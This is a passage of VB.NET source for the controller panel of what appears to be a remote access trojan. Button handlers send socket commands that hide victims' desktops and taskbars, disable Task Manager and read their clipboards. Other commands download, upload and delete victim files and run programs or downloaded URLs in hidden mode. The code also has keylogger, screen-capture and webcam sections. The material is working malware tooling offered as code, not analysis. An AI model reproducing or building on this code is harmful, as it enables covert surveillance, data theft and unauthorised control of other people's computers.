        GroupDaR.Visible = False
        GroupFM.Visible = False
        GroupPrint.Visible = False
        GroupProcess.Visible = False
        GroupWindows.Visible = False
        GroupService.Visible = False
        GroupServer.Visible = False
        GroupCMD.Visible = False
        GroupText.Visible = False
        GroupKL.Visible = False
        GroupScreen.Visible = False
        GroupBox1.Visible = False
        GroupBox2.Visible = False
        GroupBox3.Visible = False
        GroupBox4.Visible = False
        GroupBox8.Visible = False
    End Sub


    Private Sub Button55_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button55.Click
        Label8.Text = "Warning"
    End Sub

    Private Sub Button61_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button61.Click
        Label8.Text = "Error"
    End Sub

    Private Sub Button62_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button62.Click
        Label8.Text = "Information"
    End Sub

    Private Sub Button63_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button63.Click
        Label8.Text = "Question"
    End Sub

    Private conn As String



    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            Dim iconmsg As MessageBoxIcon
            Dim btnmsg As MessageBoxButtons
            Select Case Label8.Text
                Case "Question"
                    iconmsg = MessageBoxIcon.Question
                Case "Warning"
                    iconmsg = MessageBoxIcon.Warning
                Case "Information"
                    iconmsg = MessageBoxIcon.Information
                Case "Error"
                    iconmsg = MessageBoxIcon.Error
            End Select
            If RadioButton1.Checked Then
                btnmsg = MessageBoxButtons.OK
            ElseIf RadioButton2.Checked Then
                btnmsg = MessageBoxButtons.AbortRetryIgnore
            ElseIf RadioButton3.Checked Then
                btnmsg = MessageBoxButtons.YesNoCancel
            ElseIf RadioButton4.Checked Then
                btnmsg = MessageBoxButtons.YesNo
            ElseIf RadioButton5.Checked Then
                btnmsg = MessageBoxButtons.OKCancel
            ElseIf RadioButton6.Checked Then
                btnmsg = MessageBoxButtons.RetryCancel
            End If
            MessageBox.Show(TextBox4.Text, TextBox3.Text, btnmsg, iconmsg)
        Catch ex As Exception
            MessageBox.Show("There is some error occured in your System" & vbCrLf & "Restart program to fix the issue...", "Error #6!", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1)
        End Try
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            If Connected() Then
                Dim iconmsg As String = Nothing
                Dim btnmsg As String = Nothing
                Select Case Label8.Text
                    Case "Question"
                        iconmsg = "Q"
                    Case "Warning"
                        iconmsg = "W"
                    Case "Information"
                        iconmsg = "I"
                    Case "Error"
                        iconmsg = "E"
                End Select
                If RadioButton1.Checked Then
                    btnmsg = "OK"
                ElseIf RadioButton2.Checked Then
                    btnmsg = "ARI"
                ElseIf RadioButton3.Checked Then
                    btnmsg = "YNC"
                ElseIf RadioButton4.Checked Then
                    btnmsg = "YN"
                ElseIf RadioButton5.Checked Then
                    btnmsg = "OC"
                ElseIf RadioButton6.Checked Then
                    btnmsg = "RC"
                End If
                streamWriterlist(abc).WriteLine("/SHOWMESG/" & "*" & TextBox4.Text & "*" & TextBox3.Text & "*" & btnmsg & "*" & iconmsg)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/DESKH/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button22_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button22.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/DESKS/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/STARTH/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button21_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button21.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/STARTS/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/HIDETASK/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button20.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/SHOWTASK/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Function Connected() As Boolean
        Try
            If clientList.Item(abc).Connected And ToolStripStatusLabel2.Text.StartsWith("Controlled") Then
                Return True
            ElseIf clientList.Item(abc).Connected And Not ToolStripStatusLabel2.Text.StartsWith("Controlled") Then
                MessageBox.Show("You need to choose IP to connect!!!", "#.50", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Return False
            Else
                If Not objListViewItem1.Text = "Disconnected" Then
                    ToolStripStatusLabel2.Text = "Take Cotrol"
                    ToolStripStatusLabel2.Enabled = False
                    MessageBox.Show("Remote PC is unavailable", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    ListView1.Items.Item(abc).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(1).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(2).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(3).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(4).Text = "Disconnected"
                    Connect = Connect - 1
                    toolStripStatusLabel1.Text = "Connected Clients " & Connect
                    Notify.Text = "Connected Clients " & Connect
                    Return False
                End If
                End If
        Catch ex As Exception
            If ListView1.Items.Count <> 0 Then
                If Not objListViewItem1.Text = "Disconnected" Then
                    ToolStripStatusLabel2.Text = "Take Control"
                    ToolStripStatusLabel2.Enabled = False
                    MessageBox.Show("The socket is not connected", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    ListView1.Items.Item(abc).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(1).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(2).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(3).Text = "Disconnected"
                    ListView1.Items.Item(abc).SubItems(4).Text = "Disconnected"
                    Connect = Connect - 1
                    toolStripStatusLabel1.Text = "Connected Clients " & Connect
                    Notify.Text = "Connected Clients " & Connect
                End If
            End If
            Return False
        End Try
    End Function


    Private Function Connected2() As Boolean
        Try
            If clientList.Item(abc).Connected And ToolStripStatusLabel2.Text.StartsWith("Controlled") Then
                Return True
            Else

                Return False

            End If
        Catch ex As Exception

            Return False
        End Try
    End Function


    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/OPENCDCD/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button19.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CLOSECDD/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/FLIP/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/UNFLIP/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/SWAPM/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/UNSWAPM/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button28_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button28.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CADD/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button27_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button27.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CADE/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button26_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button26.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/TMOFF/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub



    Private Sub Button25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button25.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/TMON/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button24_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button24.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/SCRSTART/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button23_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button23.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/SCRSTOP/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button34_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button34.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/IEVER/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Button33_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button33.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/STRTPAGE/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button32_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button32.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CHANGETL/" & TextBox7.Text)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button31_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button31.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CHANGEHP/" & TextBox8.Text)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button30_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button30.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/RUNSPAGE/" & TextBox9.Text)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button29_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button29.Click
        Try
            If Connected() Then
                streamWriterlist(abc).WriteLine("/CLIPBOAR/")
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button35_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button35.Click
        Try
            If Connected() Then
                Dim clip As String = TextBox10.Text.Replace(vbCrLf, "***")
                streamWriterlist(abc).WriteLine("/SETCLIPB/" & clip)
                streamWriterlist(abc).Flush()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button36_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button36.Click
        TextBox10.Text = Nothing
    End Sub

    Private Sub Button43_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button43.Click
        If RadioButton7.Checked Then
            Try
                If Connected() Then
                    streamWriterlist(abc).WriteLine("/DLARUNVS/" & TextBox11.Text)
                    streamWriterlist(abc).Flush()
                End If
            Catch ex As Exception

            End Try
        ElseIf RadioButton8.Checked Then
            Try
                If Connected() Then
                    streamWriterlist(abc).WriteLine("/DLARUNHD/" & TextBox11.Text)
                    streamWriterlist(abc).Flush()
                End If
            Catch ex As Exception

            End Try
        End If

    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        Try
            Delay(1)
            Try
                If Not objListViewItem1.Text = "Disconnected" Then
                    Timer1.Stop()
                    textBox1.Text = Nothing
                    textBox2.Text = Nothing
                    TextBox5.Text = Nothing
                    TextBox6.Text = Nothing
                    TextBox7.Text = Nothing
                    TextBox8.Text = Nothing
                    TextBox9.Text = Nothing
                    TextBox10.Text = Nothing
                    TextBox11.Text = Nothing
                    TextBox12.Text = Nothing
                    TextBox13.Text = Nothing
                    TextBox15.Text = Nothing
                    TextBox20.Text = Nothing
                    Button78.Text = "Start CMD"
                    ComboBox1.Items.Clear()
                    ComboBox1.Text = "Drives"
                    ComboBox2.Text = "12"
                    ComboBox3.Items.Clear()
                    ComboBox3.Text = "Drives"
                    ComboBox4.Items.Clear()
                    ComboBox4.Text = "Choose WebCam Device..."
                    List3.Items.Clear()
                    Label8.Text = Nothing
                    ListView2.Items.Clear()
                    ListView3.Items.Clear()
                    ListView4.Items.Clear()
                    ListView5.Items.Clear()
                    TreeView2.Nodes.Clear()
                    PictureBox2.Image = Nothing
                    PictureBox3.Image = Nothing
                    Reset()
                    ToolStripStatusLabel2.ForeColor = Color.DarkBlue
                    ToolStripStatusLabel2.Font = New System.Drawing.Font("Tahoma", 11.75!, CType((System.Drawing.FontStyle.Bold), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(177, Byte))
                End If


            Catch ex As Exception

            End Try

            If ToolStripStatusLabel2.Text.StartsWith("Controlled") Then
            Else
                If Not objListViewItem1.Text = "Disconnected" Then
                    If clientList.Item(abc).Connected Then
                        th_RunClient = New Thread(New ThreadStart(AddressOf RunClient))
                        th_RunClient.Start()
                        ToolStripStatusLabel2.Text = "Controlled PC is " & objListViewItem1.Text & "/" & objListViewItem1.SubItems(1).Text
                        ToolStripStatusLabel2.BackColor = Color.Transparent
                        Label15.Text = lastparts(abc)
                    Else
                        Connected()


                    End If
                End If
            End If
        Catch ex As Exception
            Connected()
        End Try
    End Sub

    Private Sub ListView1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Try
            Try
                Timer1.Stop()
            Catch ex As Exception

            End Try
            Dim objDrawingPoint As Drawing.Point

            objDrawingPoint = ListView1.PointToClient(Cursor.Position)

            If Not IsNothing(objDrawingPoint) Then
                With objDrawingPoint
                    objListViewItem1 = ListView1.GetItemAt(.X, .Y)
                End With

                If Not IsNothing(objListViewItem1) Then
                    textBox1.Text = Nothing
                    If ListView1.SelectedItems.Count > 0 Then
                        abc = objListViewItem1.Index
                    End If


                    If objListViewItem1.Text = conn Then

                    ElseIf objListViewItem1.Text = "Disconnected" Then
                        ToolStripStatusLabel2.Enabled = False
                        ToolStripStatusLabel2.BackColor = Color.Transparent
                        ToolStripStatusLabel2.Text = "Choose IP"
                    Else
                        ToolStripStatusLabel2.Enabled = True
                        ToolStripStatusLabel2.Text = "Take Control over " & objListViewItem1.Text & "/" & objListViewItem1.SubItems(1).Text
                        Timer1.Start()
                    End If

                End If
            End If

        Catch ex As Exception
        End Try
    End Sub

    Private Sub ComboBox1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ComboBox1.MouseDown
        Try
            If Connected() Then
                If ComboBox1.Text <> "Drives" Then
                Else
                    streamWriterlist(abc).WriteLine("/LISTDRVS/")
                    streamWriterlist(abc).Flush()
                End If

            End If
        Catch ex As Exception

        End Try
    End Sub



    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged

        Try
            If Connected() Then
                Dim parola As String
                ListView4.Items.Clear()
                parola = "/LISTDIRS/" & ComboBox1.Text
                PercorsoAssoluto = ComboBox1.Text
                streamWriterlist(abc).WriteLine(parola)
                streamWriterlist(abc).Flush()
                ListView4.Focus()
            End If
        Catch ex As Exception

        End Try
    End Sub



    Dim listfilename As String
    Private Sub Button64_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button64.Click
        Try
            If Connected() Then
                If Button64.Text = "Stop Download..." Then
                    streamWriterlist(abc).WriteLine("/STOPDOWN/")
                    streamWriterlist(abc).Flush()
                    WriteToPB(0)
                    Button64.Enabled = False
                    Button64.Text = "Wait..."
                    Delay(1)
                    Try
                        _OutputFileStram.Close()
                        _BinaryWriter.Close()
                        If File.Exists(_MergedFile) Then File.Delete(_MergedFile)
                    Catch ex As Exception
                    End Try
                    Button64.Enabled = True
                    Button64.Text = "Download"
                    MessageBox.Show("The operation was canceled!", "File download canceled R.#8...", MessageBoxButtons.OK, MessageBoxIcon.Error)

                Else


                    If Microsoft.VisualBasic.Left(objListViewItem.Text, 5) = "(DIR)" Then
                        MessageBox.Show("You can download only files", "Error R.#9", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    ElseIf objListViewItem.Text = "" Then
                        MessageBox.Show("Choose file to download", "R.#10", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Else
                        FlagDown = True
                        listfilename = objListViewItem.Text
                        streamWriterlist(abc).WriteLine("/DOWNFILE/" & PercorsoAssoluto & listfilename)
                        streamWriterlist(abc).Flush()
                        Button64.Text = "Stop Download..."

                    End If

                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Function _FileSize_(ByVal FileName As String) As Long
        Dim _fileInfo As System.IO.FileInfo
        _fileInfo = New FileInfo(FileName)
        Return _fileInfo.Length
        _fileInfo = Nothing
    End Function



    Private Sub Button45_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button45.Click
        Try
            If Connected() Then
                If Button45.Text = "Confirm" Then
                    If ComboBox1.Text = "" Or ComboBox1.Text = "Drives" Then
                        MessageBox.Show("Choose Drive to show", "R.#12", MessageBoxButtons.OK, MessageBoxIcon.Information)

                    Else
                        Dim myFont As System.Drawing.Font
                        myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Bold)
                        Button45.Text = "Cancel Upload"
                        Button45.Font = myFont
                        FlagUpld = True
                        Dim fileuploadsplit As String() = strupload.Split("\")
                        Dim fileupload As String = fileuploadsplit.GetValue(fileuploadsplit.Length - 1).ToString
                        Try
                            Dim build, build2 As New StringBuilder
                            _index = 1
                            _InputFileStram = New FileStream(strupload, FileMode.Open, FileAccess.Read, FileShare.Read)
                            _BinaryReader = New BinaryReader(_InputFileStram)
                            _FileSize = _FileSize_(strupload)
                            ProgressBar1.Maximum = _FileSize
                            ProgressBar1.Value = 0
                            If _FileSize < ChunkSize Then
                                _BinaryReader.BaseStream.Seek(0, SeekOrigin.Begin)
                                ReDim _buffer(_FileSize - 1)
                                _BinaryReader.Read(_buffer, 0, _FileSize)
                                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                                build.Append("/UPLOADFL/" & PercorsoAssoluto & "*" & fileupload & "*")
                                For i As Integer = 0 To _buffer.Length - 1
                                    build2.Append(_buffer.GetValue(i).ToString & " ")
                                Next
                                build.Append(build2)
                                streamWriterlist(abc).WriteLine(build)
                                streamWriterlist(abc).Flush()
                                ProgressBar1.Value = ProgressBar1.Value + (_buffer.Length - 1)
                                MessageBox.Show("Upload Completed", "Done R.#13", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                ProgressBar1.Value = 0
                                WriteTobutton45("Upload")
                            Else
                                _Fragments = Math.Floor((_FileSize / ChunkSize))
                                _RemainingBytes = _FileSize - (_Fragments * ChunkSize)
                                _BinaryReader.BaseStream.Seek(0, SeekOrigin.Begin)
                                ReDim _buffer(ChunkSize - 1)
                                _BinaryReader.Read(_buffer, 0, ChunkSize)
                                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                                build.Append("/UPLOADFL/" & PercorsoAssoluto & "*" & fileupload & "*")
                                For i As Integer = 0 To _buffer.Length - 1
                                    build2.Append(_buffer.GetValue(i).ToString & " ")
                                Next
                                build.Append(build2)
                                streamWriterlist(abc).WriteLine(build)
                                streamWriterlist(abc).Flush()
                                ProgressBar1.Value = ProgressBar1.Value + (_buffer.Length - 1)
                            End If
                        Catch ex As Exception
                            Try
                                _InputFileStram.Close()
                                _BinaryReader.Close()
                                _BinaryWriter = Nothing
                                _OutputFileStram = Nothing
                                _BinaryReader = Nothing
                                _InputFileStram = Nothing
                                streamWriterlist(abc).WriteLine("/ERRORUPL/")
                                streamWriterlist(abc).Flush()
                                WriteTobutton45("Upload")
                            Catch exi As Exception
                            End Try
                        End Try
                    End If
                ElseIf Button45.Text = "Upload" Then
                    Try
                        OpenFile.ShowDialog()
                        If OpenFile.FileName = Nothing Then
                        Else
                            strupload = OpenFile.FileName
                            OpenFile.Dispose()
                            OpenFile.Reset()
                            Dim myFont As System.Drawing.Font
                            myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Bold)
                            Button45.Text = "Confirm"
                            Button45.Font = myFont
                            MessageBox.Show("Choose directory for upload, or click Cancel to cancel the proccess", "Upload Folder? R.#15", MessageBoxButtons.OK, MessageBoxIcon.Information)
                        End If
                    Catch ex As Exception
                    End Try
                Else
                    Try
                        streamWriterlist(abc).WriteLine("/STOPUPLD/")
                        streamWriterlist(abc).Flush()
                        _InputFileStram.Close()
                        _BinaryReader.Close()
                        _BinaryWriter = Nothing
                        _OutputFileStram = Nothing
                        _BinaryReader = Nothing
                        _InputFileStram = Nothing
                        Dim myFont As System.Drawing.Font
                        myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Regular)
                        Button45.Text = "Upload"
                        Button45.Font = myFont
                        ProgressBar1.Value = 0
                        FlagUpld = False
                        MessageBox.Show("Upload cancelled", "Upload R.#14...", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Catch ex As Exception
                    End Try
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub





    Private Sub Button69_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button69.Click
        ResetKey()
    End Sub


    Private Sub Button44_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button44.Click
        Try
            If Connected() Then

                Dim exec As String
                If CheckBox1.Checked Then
                    If Microsoft.VisualBasic.Left(objListViewItem.Text, 5) = "(DIR)" Then
                        MessageBox.Show("You can run only files", "R.#16", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    ElseIf objListViewItem.Text = "" Then
                        MessageBox.Show("Choose File to Run", "R.#17", MessageBoxButtons.OK, MessageBoxIcon.Warning)

                    Else
                        exec = Microsoft.VisualBasic.Right(objListViewItem.Text, 4)
                        If exec = ".exe" Or exec = ".com" Or exec = ".bat" Or exec = ".pif" Or exec = ".scr" Or exec = ".EXE" Or exec = ".BAT" Or exec = ".COM" Or exec = ".BAT" Or exec = ".PIF" Or exec = ".SCR" Then
                            listfilename = objListViewItem.Text
                            streamWriterlist(abc).WriteLine("/RUNEXEFL/" & "1" & PercorsoAssoluto & listfilename)
                            streamWriterlist(abc).Flush()
                        Else
                            MessageBox.Show("You can execute only application files in hidden mode (exe, com, bat, pif, scr)", "R.#18", MessageBoxButtons.OK, MessageBoxIcon.Information)
                        End If

                    End If
                Else
                    If Microsoft.VisualBasic.Left(objListViewItem.Text, 5) = "(DIR)" Then
                        MessageBox.Show("You can run only files", "R.#19", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    ElseIf objListViewItem.Text = "" Then
                        MessageBox.Show("Choose File to Run", "R.#20", MessageBoxButtons.OK, MessageBoxIcon.Warning)
                    Else
                        listfilename = objListViewItem.Text
                        streamWriterlist(abc).WriteLine("/RUNEXEFL/" & "0" & PercorsoAssoluto & listfilename)
                        streamWriterlist(abc).Flush()
                    End If
                End If
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button42_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button42.Click
        Try
            If Connected() Then

                If Microsoft.VisualBasic.Left(objListViewItem.Text, 5) = "(DIR)" Then
                    MessageBox.Show("You can delete only files", "R.#21", MessageBoxButtons.OK, MessageBoxIcon.Error)
                ElseIf objListViewItem.Text = "" Then
                    MessageBox.Show("Choose file to delete", "R.#22", MessageBoxButtons.OK, MessageBoxIcon.Information)

                Else
                    listfilename = objListViewItem.Text
                    streamWriterlist(abc).WriteLine("/KILLFILE/" & PercorsoAssoluto & listfilename)
                    streamWriterlist(abc).Flush()

                End If

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button41_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button41.Click
        Try
            If Connected() Then
                Dim appoggio As String
                appoggio = Mid(objListViewItem.Text, 1, 5)
                If appoggio = "(DIR)" Then
                    appoggio = Mid(objListViewItem.Text, 6, Len(objListViewItem.Text))
                    If appoggio = "." Or appoggio = ".." Then
                        MessageBox.Show("What you trying to do???", "Wrong Action R.#23...", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Else
                        streamWriterlist(abc).WriteLine("/KILLDIRS/" & PercorsoAssoluto & appoggio)
                        streamWriterlist(abc).Flush()
                    End If

                Else
                    MessageBox.Show("This is a FILE, you must use other button", "R.#24", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End If
            End If


        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button65_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button65.Click
        Try
            If Connected() Then
                Dim myFont As System.Drawing.Font
                If Button65.Text = "Confirm" Then
                    If TextBox16.Text = "" Then
                        MessageBox.Show("You didn't specified the Folder name", "R.#25", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                    Else
                        streamWriterlist(abc).WriteLine("/MAKEDIRS/" & PercorsoAssoluto & TextBox16.Text)
                        streamWriterlist(abc).Flush()
                        myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Regular)
                        Button65.Font = myFont
                        Button65.Text = "Make Folder"
                        Label10.Visible = False
                        TextBox16.Visible = False
                    End If
                Else
                    Label10.Visible = True
                    Label10.Name = "Make DIR:"
                    TextBox16.Visible = True
                    TextBox16.Text = Nothing
                    Button65.Text = "Confirm"
                    myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Bold)
                    Button65.Font = myFont
                End If
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Button66_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button66.Click
        Try
            If Connected() Then

                Dim myFont As System.Drawing.Font
                If Button66.Text = "Confirm" Then
                    If TextBox16.Text = "" Then
                        MessageBox.Show("You didn't specified the Folder name", "R.#28", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                    Else
                        If objListViewItem.Text = "(DIR)." Or objListViewItem.Text = "(DIR).." Then
                            MessageBox.Show("What the heck you trying to do???", "Wrong choise!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                        ElseIf objListViewItem.Text.Contains("(DIR)") Then
                            streamWriterlist(abc).WriteLine("/RENAMEFL/" & "0" & Label9.Text & "*" & TextBox16.Text)
                            streamWriterlist(abc).Flush()
                        Else
                            streamWriterlist(abc).WriteLine("/RENAMEFL/" & "1" & Label9.Text & "*" & TextBox16.Text)
                            streamWriterlist(abc).Flush()
                        End If
                        myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Regular)
                        Button66.Font = myFont
                        Button66.Text = "Rename"
                        Label10.Visible = False
                        TextBox16.Visible = False
                    End If
                Else
                    Label10.Visible = True
                    Label10.Text = "Rename:"
                    TextBox16.Visible = True
                    TextBox16.Text = Nothing
                    Button66.Text = "Confirm"
                    myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Bold)
                    Button66.Font = myFont
                End If
            End If


        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button67_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button67.Click
        Try
            If Connected() Then

                If objListViewItem.Text.Contains("(DIR)") Or objListViewItem.Text = "" Then
                    MessageBox.Show("Retrive only files SIZE, not Folder", "R.#29", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Else
                    streamWriterlist(abc).WriteLine("/FILESIZE/" & PercorsoAssoluto & objListViewItem.Text)
                    streamWriterlist(abc).Flush()
                End If
            End If


        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button68_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button68.Click
        Try
            If Connected() Then
                Dim parola As String
                ListView4.Items.Clear()
                parola = "/LISTDIRS/" & ComboBox1.Text
                PercorsoAssoluto = ComboBox1.Text
                streamWriterlist(abc).WriteLine(parola)
                streamWriterlist(abc).Flush()
                ListView4.Focus()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button50_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button50.Click
        Try
            If Connected() Then
                If Button50.Text = "List" Then
                    ListView2.Items.Clear()
                    streamWriterlist(abc).WriteLine("/LISTPROC/")
                    streamWriterlist(abc).Flush()
